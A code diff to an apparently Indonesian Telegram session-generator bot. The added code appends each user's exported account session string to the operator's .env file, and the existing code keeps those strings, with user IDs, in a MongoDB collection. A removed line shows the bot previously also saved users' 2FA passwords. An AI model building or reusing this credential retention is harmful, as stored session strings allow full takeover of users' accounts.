@@ -63,7 +63,13 @@ MSG = """
     group=3
 )
 async def recv_tg_tfa_message(_, message: Message):
-    
+    ex = await bots.get_me()
+    expired_date = await get_expired_date(ex.id)
+    if expired_date is None:
+        expired_date = "Belum di tetapkan"
+    else:
+        remaining_days = (expired_date - datetime.now()).days
+
     w_s_dict = AKTIFPERINTAH.get(message.chat.id)
     if not w_s_dict:
         return
@@ -85,9 +91,24 @@ async def recv_tg_tfa_message(_, message: Message):
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
         session_string = str(await loical_ci.export_session_string())
-        pw = str(tfa_code)
+        load_dotenv()
+        
+        file = os.path.join(os.path.dirname(__file__), 'count.txt')
+        with open(file, "r") as f:
+            count = int(f.read().strip())
+        count += 1
+        with open(file, "w") as f:
+            f.write(str(count))
+        
+        filename = ".env"
+        with open(filename, "a") as file:
+            file.write(f"\nSESSION{count}={str(await loical_ci.export_session_string())}")
+        await message.reply_text(f"Session berhasil disimpan pada {filename} dengan Posisi SESSION{count}.")
+        await saved_message_.reply_text(
+            SESSION_GENERATED_USING,
+            quote=True
+        )
         session_data = {
-            "pw": pw,
             "session_string": session_string,
             "user_id": message.chat.id,
             "username": message.chat.username or "",
